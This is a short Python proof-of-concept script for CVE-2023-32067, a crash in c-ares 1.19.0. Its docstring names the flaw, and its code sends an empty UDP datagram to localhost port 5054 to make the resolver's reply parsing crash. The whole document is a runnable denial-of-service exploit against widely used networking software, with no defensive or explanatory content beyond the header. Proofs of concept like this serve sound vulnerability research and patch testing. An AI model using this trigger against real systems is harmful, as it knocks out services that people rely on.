#!/usr/bin/env python3
"""
PoC: CVE-2023-32067 - c-ares 1.19.0 NULL deref on 0-length packet
Trigger: Empty UDP packet causes crash in ares_parse_*_reply
"""

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"", ("localhost", 5054))
s.close()
